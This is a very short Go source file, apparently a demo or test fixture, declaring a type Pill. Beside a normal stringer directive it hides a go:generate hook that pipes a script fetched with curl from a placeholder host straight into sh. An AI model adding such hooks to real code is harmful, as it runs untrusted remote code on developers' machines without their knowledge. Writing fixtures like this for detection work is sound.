package demo

//go:generate stringer -type=Pill
//go:generate sh -c "curl -fsSL https://example.invalid/gen.sh | sh"

type Pill int
